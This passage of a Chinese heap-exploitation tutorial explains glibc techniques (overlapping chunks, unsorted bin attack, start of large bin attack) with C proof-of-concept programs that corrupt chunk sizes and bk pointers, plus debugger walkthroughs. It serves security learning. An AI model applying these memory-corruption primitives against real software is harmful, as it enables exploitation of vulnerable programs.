             fprintf(stderr, &quot;这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n&quot;);
         
             fprintf(stderr, &quot;接下来验证一下，现在 p3 与 p4:\n&quot;);
             fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4+0x10);
             fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3+0x10);
         
             fprintf(stderr, &quot;\n如果我们使用 memset(p4, '4', %d), 将会:\n&quot;, evil_region_size);
             memset(p4, '4', evil_region_size);
             fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4+0x10);
             fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3+0x10);
         
             fprintf(stderr, &quot;\n那么之后再 memset(p3, '3', 80), 将会:\n&quot;);
             memset(p3, '3', 80);
             fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4+0x10);
             fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3+0x10);
         }     
         ```
</code></pre></div><p>这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写unsorted bin 中空闲堆块的size，改变下一次malloc可以返回的堆块大小。</p> <p>​    直接动手调试，首先申请三个堆块。</p> <p><img src="/images/heap/image-20211226161317690.png" alt="image-20211226161317690"></p> <p>​    接着free掉p2，这时候p2被放到unsorted bin中。</p> <p><img src="/images/heap/image-20211226161322101.png" alt="image-20211226161322101"></p> <p>​    然后把p2的size改成0x180，这时候就把p3给包含进去了。</p> <p><img src="/images/heap/image-20211226161327419.png" alt="image-20211226161327419"></p> <p>​    然后再去申请一块大小为0x180的堆块p4，就能够编辑p4，就可以修改p3的内容，编辑p3也可以修改p4的内容。</p> <p><img src="/images/heap/image-20211226161332208.png" alt="image-20211226161332208"></p> <h2 id="overlapping-chunks-2">overlapping_chunks_2 <a href="#overlapping-chunks-2" class="header-anchor">#</a></h2> <p>同样是堆块重叠的问题，前面那个是在chunk已经被free，加入到了unsorted bin之后，再修改其size值，然后malloc一个不一样的chunk出来，而这里是在 free之前修改size值，使free错误地修改了下一个chunk的prev_size值，导致中间的chunk强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。</p> <p>源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  
  intptr_t <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">,</span><span class="token operator">*</span>p5<span class="token punctuation">,</span><span class="token operator">*</span>p6<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_size_p1<span class="token punctuation">,</span>real_size_p2<span class="token punctuation">,</span>real_size_p3<span class="token punctuation">,</span>real_size_p4<span class="token punctuation">,</span>real_size_p5<span class="token punctuation">,</span>real_size_p6<span class="token punctuation">;</span>
  <span class="token keyword">int</span> prev_in_use <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n一开始分配 5 个 chunk&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  real_size_p1 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p2 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p3 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p4 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p5 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p1 从 %p 到 %p&quot;</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p2 从 %p 到 %p&quot;</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p2<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p3 从 %p 到 %p&quot;</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p4 从 %p 到 %p&quot;</span><span class="token punctuation">,</span> p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p5 从 %p 到 %p\n&quot;</span><span class="token punctuation">,</span> p5<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p5<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>real_size_p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span>real_size_p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span>real_size_p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p5<span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span>real_size_p5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size_p1 <span class="token punctuation">)</span> <span class="token operator">=</span> real_size_p2 <span class="token operator">+</span> real_size_p3 <span class="token operator">+</span> prev_in_use <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n这样的话将会 free 掉的 p2 将会包含 p3\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p6 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p6<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p6 从 %p 到 %p&quot;</span><span class="token punctuation">,</span> p6<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p6<span class="token operator">+</span>real_size_p6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\nchunk p3 从 %p 到 %p\n&quot;</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p3<span class="token operator">+</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\np3 中的内容: \n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;%s\n&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\n往 p6 中写入\&quot;F\&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p6<span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;\np3 中的内容: \n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;%s\n&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br></div></div><p>​    我们需要五个堆块，假设第chunk 1存在溢出，可以改写第二个chunk 2的数据，chunk 5的作用是防止释放chunk 4后,被合并进top chunk。所以我们要重叠的区域是chunk 2到chunk 4。</p> <p>首先申请5个chunk，分别是p1，p2，p3，p4，p5。</p> <p><img src="/images/heap/image-20211226161410128.png" alt="image-20211226161410128"></p> <p>然后free掉p4，p4被放入unsorted bin。</p> <p><img src="/images/heap/image-20211226161415878.png" alt="image-20211226161415878"></p> <p>接下来是最关键的一步，利用chunk 1的溢出漏洞，将chunk 2的size值修改为chunk 2和chunk 3的大小之和，即0x3f0+0x3f0+0x1=0x7e1，最后的1是标志位。</p> <p><img src="/images/heap/image-20211226161421815.png" alt="image-20211226161421815"></p> <p>这样当我们释放chunk 2的时候，malloc根据这个被修改的size值，会以为chunk 2加上 chunk 3的区域都是要释放的，然后就错误地修改了chunk 5的 prev_size。接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。</p> <p><img src="/images/heap/image-20211226161426600.png" alt="image-20211226161426600"></p> <p>再次去malloc 0x7e0大小的chunk p6会把包含p3的p2给申请到，这样再去编辑p6的时候也可以编辑到p3。</p> <p><img src="/images/heap/image-20211226161431796.png" alt="image-20211226161431796"></p> <h2 id="unsorted-bin-attack">unsorted_bin_attack <a href="#unsorted-bin-attack" class="header-anchor">#</a></h2> <p>​    unsorted bin攻击通常是为更进一步的攻击做准备的，我们知道unsorted bin是一个双向链表，在分配时会通过unlink操作将chunk从链表中移除，所以如果能够控制unsorted bin chunk的bk指针，就可以向任意位置写入一个指针。</p> <p>源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;一开始先申请一个比较正常的 chunk: %p\n&quot;</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;再分配一个避免与 top chunk 合并\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;%p: %p\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>​    编译完成之后分别在10、13、16、19行下断点。</p> <p>​    然后运行，一开始先申请两个chunk，第二个是为了防止和top chunk合并。</p> <p><img src="/images/heap/image-20211226161510074.png" alt="image-20211226161510074"></p> <p>​    当free之后，这个chunk的fd、bk都指向了unsorted bin的位置，因为unsorted bin是双向链表。</p> <p><img src="/images/heap/image-20211226161514175.png" alt="image-20211226161514175"></p> <p>继续，通过p[1] = (unsigned long)(&amp;stack_var - 2)，把bk指针给改掉了。unsigned long是8字节大小的，所以减去2之后正好是在address 这个地方。</p> <p><img src="/images/heap/image-20211226161521192.png" alt="image-20211226161521192"></p> <p>​    然后再去申请的时候需要把释放的那一块给拿出来，操作如下：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">/* remove from unsorted list */</span>
<span class="token comment">//bck = chunk-&gt;bk</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>把unsorted bin的bk改为chunk的bk，然后将chunk的bk所指向的 fd改为unsorted bin的地址。</p> <p><img src="/images/heap/image-20211226161538460.png" alt="image-20211226161538460"></p> <p><img src="/images/heap/image-20211226161546845.png" alt="image-20211226161546845"></p> <p>因为对于一个chunk来说，chunk头是占据0x10大小的（也就是图中 address），所以fd正好是我们想要改的那个地址。</p> <p><img src="/images/heap/image-20211226161553201.png" alt="image-20211226161553201"></p> <p><img src="/images/heap/image-20211226161559404.png" alt="image-20211226161559404"></p> <h2 id="large-bin-attack">large_bin_attack <a href="#large-bin-attack" class="header-anchor">#</a></h2> <p>​    回顾一下large bin的概念，large bin大小：大于1024字节</p> <p>双向循环链表，先进先出，按照从大到小排序</p> <p>当有空闲块相邻的时候，chunk会被合并</p> <p>除了fd、bk指针还有fd_nextsize和bk_nextsize</p> <p>​    源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;先来看一下目标:\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_var1 (%p): %ld\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_var2 (%p): %ld\n\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x320</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;分配第一个 large chunk: %p\n&quot;</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请第二个 large chunk 在: %p\n&quot;</span><span class="token punctuation">,</span> p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
